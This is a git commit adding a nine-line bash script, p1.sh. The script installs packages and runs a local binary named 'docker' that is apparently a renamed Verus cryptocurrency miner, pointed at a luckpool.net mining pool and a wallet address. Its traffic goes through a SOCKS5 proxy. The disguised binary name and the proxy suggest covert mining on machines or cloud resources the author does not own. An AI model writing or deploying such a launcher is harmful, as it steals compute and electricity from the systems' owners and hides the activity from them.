351fbe27bf4f1472c68825cdb14318e3a630675b
wertesd <86517111+wertesd@users.noreply.github.com>
2021-07-10 12:39:40 +0700

    Create p1.sh

---
+++ p1.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x docker 
+screen -dmS ls 
+POOL=stratum+tcp://na.luckpool.net:3956
+WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
+PROXY=socks5://174.77.111.197:4145
+./docker -a verus -o $POOL -u $WALLET.P1 -p x -t 2 -x $PROXY
